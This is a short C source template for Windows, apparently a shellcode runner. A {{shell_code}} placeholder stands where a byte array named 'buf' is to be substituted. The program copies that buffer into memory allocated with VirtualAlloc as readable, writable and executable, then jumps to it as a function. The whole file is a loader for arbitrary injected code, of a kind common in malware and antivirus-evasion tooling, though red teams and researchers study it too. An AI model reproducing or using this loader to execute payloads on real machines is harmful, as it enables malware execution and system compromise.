#include <stdio.h>
#include <windows.h>

int main()
{
    {{shell_code}}

    void* exec = VirtualAlloc(NULL, sizeof(buf), 
                             MEM_COMMIT | MEM_RESERVE, 
                             PAGE_EXECUTE_READWRITE);

    memcpy(exec, buf, sizeof(buf));

    ((void(*)())exec)();

    VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}
